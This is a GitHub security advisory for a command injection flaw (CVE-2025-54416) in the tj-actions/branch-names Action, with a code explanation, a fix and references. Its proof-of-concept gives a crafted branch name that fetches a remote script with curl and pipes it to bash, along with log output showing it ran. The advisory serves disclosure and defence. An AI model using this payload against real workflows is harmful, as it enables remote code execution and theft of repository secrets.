# [C] tj-actions/branch-names has a Command Injection Vulnerability

## Summary
Severity: Critical
Advisory: GHSA-gq52-6phf-x2r6
CVE: CVE-2025-54416
CWE: CWE-77
Ecosystem: GitHub Actions
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L (CVSS_V3)
Published: 2025-07-25
Source: https://github.com/advisories/GHSA-gq52-6phf-x2r6
Type: github-advisory

## Affected
- GitHub Actions: `tj-actions/branch-names` — affected >=0 <9.0.0

## Details
#### **Overview**

A critical vulnerability has been identified in the `tj-actions/branch-names` GitHub Action workflow which allows arbitrary command execution in downstream workflows. This issue arises due to inconsistent input sanitization and unescaped output, enabling malicious actors to exploit specially crafted branch names or tags. While internal sanitization mechanisms have been implemented, the action outputs remain vulnerable, exposing consuming workflows to significant security risks.

#### **Technical Details**

The vulnerability stems from the unsafe use of the `eval printf "%s"` pattern within the action's codebase. Although initial sanitization using `printf "%q"` properly escapes untrusted input, subsequent unescaping via `eval printf "%s"` reintroduces command injection risks. This unsafe pattern is demonstrated in the following code snippet:

```bash
echo "base_ref_branch=$(eval printf "%s" "$BASE_REF")" >> "$GITHUB_OUTPUT"
echo "head_ref_branch=$(eval printf "%s" "$HEAD_REF")" >> "$GITHUB_OUTPUT"
echo "ref_branch=$(eval printf "%s" "$REF_BRANCH")" >> "$GITHUB_OUTPUT"
```

This approach allows attackers to inject arbitrary commands into workflows consuming these outputs, as shown in the Proof-of-Concept (PoC) below.

#### **Proof-of-Concept (PoC)**

1. Create a branch with the name `$(curl,-sSfL,www.naturl.link/NNT652}${IFS}|${IFS}bash)`.
2. Trigger the vulnerable workflow by opening a pull request into the target repository.
3. Observe arbitrary code execution in the workflow logs.

Example output:
```bash
Running on a pull request branch.
Run echo "Running on pr: $({curl,-sSfL,www.naturl.link/NNT652}${IFS}|${IFS}bash)"
  echo "Running on pr: $({curl,-sSfL,www.naturl.link/NNT652}${IFS}|${IFS}bash)"
  shell: /usr/bin/bash -e {0}
Running on pr: === PoC script executed successfully ===
Runner user: runner
```

#### **Impact**

This vulnerability enables arbitrary command execution in repositories consuming outputs from `tj-actions/branch-names`. The severity of the impact depends on the permissions granted to the `GITHUB_TOKEN` and the context of the triggering event. Potential consequences include:

- Theft of sensitive secrets stored in the repository.
- Unauthorized write access to the repository.
- Compromise of the repository's integrity and security.

#### **Mitigation and Resolution**

To address this vulnerability, the unsafe `eval printf "%s"` pattern must be replaced with safer alternatives. Specifically, direct `printf` calls can achieve the same functionality without unescaping shell-unsafe characters. Below is the recommended fix:

```bash
printf "base_ref_branch=%s\n" "$BASE_REF" >> "$GITHUB_OUTPUT"
printf "head_ref_branch=%s\n" "$HEAD_REF" >> "$GITHUB_OUTPUT"
printf "ref_branch=%s\n" "$REF_BRANCH" >> "$GITHUB_OUTPUT"
printf "tag=%s\n" "$TAG" >> "$GITHUB_OUTPUT"
```

This approach ensures that all outputs remain properly escaped and safe for downstream consumption.

#### **Recommendations**

1. **Immediate Action**: Developers using the `tj-actions/branch-names` workflow should update their workflows to latest major version [v9](https://github.com/tj-actions/branch-names/releases/tag/v9.0.0).

#### **References**
- [GitHub Actions Security Guide](https://securitylab.github.com/resources/github-actions-untrusted-input/)
- [How to Secure GitHub Actions Workflows](https://github.blog/security/application-security/how-to-secure-your-github-actions-workflows-with-codeql/)
- [Related Vulnerability: GHSA-mcph-m25j-8j63](https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63)
- [Template Injection Advisory: GHSA-8v8w-v8xg-79rf](https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf)

## References
- https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf
- https://github.com/tj-actions/branch-names/security/advisories/GHSA-gq52-6phf-x2r6
- https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63
- https://nvd.nist.gov/vuln/detail/CVE-2025-54416
- https://github.com/tj-actions/branch-names/commit/e497ceb8ccd43fd9573cf2e375216625bc411d1f
- https://github.blog/security/application-security/how-to-secure-your-github-actions-workflows-with-codeql
- https://github.com/tj-actions/branch-names
- https://github.com/tj-actions/branch-names/releases/tag/v9.0.0
- https://securitylab.github.com/resources/github-actions-untrusted-input
